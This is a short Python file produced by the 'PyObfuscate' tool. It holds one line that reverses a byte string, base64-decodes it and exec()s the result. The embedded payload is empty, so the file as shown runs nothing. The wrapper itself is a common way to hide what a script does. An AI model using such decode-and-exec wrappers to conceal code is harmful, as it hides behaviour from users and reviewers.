# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Sat Jul  8 23:58:22 2023
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))
